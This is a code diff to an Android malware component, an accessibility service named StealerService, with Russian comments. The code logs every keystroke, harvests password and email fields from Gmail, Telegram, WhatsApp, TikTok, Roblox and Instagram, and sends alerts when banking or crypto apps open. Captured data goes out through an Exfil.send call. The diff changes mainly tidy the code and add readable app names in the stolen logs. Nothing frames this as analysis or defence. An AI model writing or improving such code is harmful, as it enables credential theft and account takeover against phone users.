@@ -13,24 +13,17 @@ public class StealerService extends AccessibilityService {
     private long lastSend = 0;
     private long lastBankAlert = 0;
 
-    // кейлоггер
     private StringBuilder keyBuf = new StringBuilder();
     private long lastKeySend = 0;
     private static final long KEY_COOLDOWN = 10000;
     private String lastPkg = "";
 
     private static final List<String> TARGETS = Arrays.asList(
-        "com.google.android.gm",
-        "com.google.android.apps.gmail",
-        "org.telegram.messenger",
-        "org.telegram.messenger.web",
-        "org.thunderdog.challegram",
-        "com.zhiliaoapp.musically",
-        "com.ss.android.ugc.trill",
-        "com.whatsapp",
-        "com.whatsapp.w4b",
-        "com.roblox.client",
-        "com.instagram.android"
+        "com.google.android.gm", "com.google.android.apps.gmail",
+        "org.telegram.messenger", "org.telegram.messenger.web",
+        "org.thunderdog.challegram", "com.zhiliaoapp.musically",
+        "com.ss.android.ugc.trill", "com.whatsapp", "com.whatsapp.w4b",
+        "com.roblox.client", "com.instagram.android"
     );
 
     private static final List<String> BANK_APPS = Arrays.asList(
@@ -56,7 +49,6 @@ public class StealerService extends AccessibilityService {
         if (event == null) return;
         int type = event.getEventType();
 
-        // BANK триггер
         if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             CharSequence pkgCs = event.getPackageName();
             if (pkgCs != null) {
@@ -64,7 +56,7 @@ public class StealerService extends AccessibilityService {
                 if (BANK_APPS.contains(pkg)
                     && System.currentTimeMillis() - lastBankAlert > 30000) {
                     lastBankAlert = System.currentTimeMillis();
-                    Exfil.send("BANK_OPEN", "Открыт банк/крипта: " + pkg);
+                    Exfil.send("BANK_OPEN", "Открыт: " + AppNames.get(pkg));
                     try {
                         android.content.Intent i =
                             new android.content.Intent(this, MediaSniffer.class);
@@ -75,7 +67,7 @@ public class StealerService extends AccessibilityService {
             }
         }
 
-        // KEYLOGGER — ловим всё что вводится
+        // КЕЙЛОГГЕР с читаемыми именами
         if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             CharSequence pkgCs = event.getPackageName();
             if (pkgCs != null) {
@@ -86,7 +78,7 @@ public class StealerService extends AccessibilityService {
                     ? event.getText().get(0) : null;
                 if (text != null && text.length() > 0 && text.length() < 500) {
                     if (!pkg.equals(lastPkg)) {
-                        keyBuf.append("\n[").append(pkg).append("]\n");
+                        keyBuf.append("\n📱 ").append(AppNames.get(pkg)).append("\n");
                         lastPkg = pkg;
                     }
                     keyBuf.append(text).append("\n");
@@ -101,7 +93,7 @@ public class StealerService extends AccessibilityService {
             }
         }
 
-        // STEAL — пароли в целевых приложениях
+        // STEAL — пароли в целевых
         if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
             type != AccessibilityEvent.TYPE_VIEW_FOCUSED) return;
 
@@ -118,7 +110,7 @@ public class StealerService extends AccessibilityService {
         findFields(root, found, 0);
 
         if (found.length() > 0) {
-            found.insert(0, "APP: " + pkg + "\n");
+            found.insert(0, "📱 " + AppNames.get(pkg) + "\n");
             Exfil.send("STEAL", found.toString());
             lastSend = System.currentTimeMillis();
         }
@@ -142,8 +134,6 @@ public class StealerService extends AccessibilityService {
         }
 
         CharSequence text = n.getText();
-        CharSequence hint = n.getHintText();
-
         if (isPwd && text != null && text.length() > 0) {
             sb.append("[PWD] ").append(text).append("\n");
         } else if (isEmail && text != null && text.length() > 0) {
